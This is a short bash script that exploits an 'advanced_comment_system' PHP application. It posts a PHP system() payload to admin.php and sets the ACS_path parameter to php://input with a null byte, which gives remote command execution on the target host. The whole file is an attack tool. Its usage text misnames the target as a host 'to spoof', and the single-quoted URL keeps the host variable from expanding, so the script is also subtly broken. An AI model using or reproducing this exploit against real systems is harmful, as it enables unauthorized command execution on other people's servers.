#!/bin/bash


HOST=$1
CMD=$2 
if [[ $# -eq 0 ]];
then
	echo "Usage: ./$0 <host to spoof> <cmd>"
	exit
fi
curl -s --data "<?system('$CMD');?>" 'http://${HOST}/internal/advanced_comment_system/admin.php?ACS_path=php://input%00'
echo
echo
